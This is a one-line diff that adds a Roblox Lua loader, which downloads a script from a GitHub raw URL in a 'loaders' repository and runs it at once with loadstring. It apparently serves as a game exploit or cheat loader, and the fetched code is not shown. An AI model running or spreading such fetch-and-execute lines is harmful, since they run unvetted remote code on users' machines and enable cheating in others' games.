@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/what-if-disasters-spam7-03ib5iu6mjeasf.lua"))()
